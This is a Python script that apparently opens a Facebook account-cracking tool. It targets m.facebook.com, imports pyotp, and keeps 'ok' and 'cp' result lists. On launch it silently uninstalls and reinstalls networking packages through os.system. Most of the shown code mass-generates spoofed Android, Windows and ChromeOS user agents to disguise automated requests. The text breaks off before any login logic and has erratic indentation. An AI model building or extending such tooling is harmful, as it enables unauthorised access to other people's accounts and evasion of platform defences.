#!/usr/bin/python3
import os

try:
    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
except ModuleNotFoundError:
    pass

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib,string
from concurrent.futures import ThreadPoolExecutor as kaam
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from string import *
from concurrent.futures import ThreadPoolExecutor as speed
from rich.markdown import Markdown as mark
from rich import pretty
from random import choice as pilih
import pyotp
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as tdp
P = '\x1b[0;97m'
M = '\x1b[0;91m' 
H = '\x1b[0;92m' 
K = '\x1b[0;93m'
B = '\x1b[0;94m'
U = '\x1b[0;95m' 
O = '\x1b[0;96m' 
N = '\x1b[0m'   
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
oks = []
cps = []
id = []
uid = []
user = []
method = []
ocp = []
tf = []
loop = 0
n=0
lim=0
tf=0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)


gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)



ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 7S'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
    aa='Mozilla/5.0 (X11; CrOS x86_64 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS x86_64 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (X11; CrOS armv7l 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS armv7l 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (X11; CrOS aarch64 15183.78.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['X11; CrOS aarch64 15183.78.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.5359.172 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	
	#Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36
	
    aa='Mozilla/5.0 (Linux; Android 12; SM-A135F;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 12; SM-A135F'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
    
    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    #Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0
    aa='Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Android 10; Xiaomi Redmi Note 9 Pro Max'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
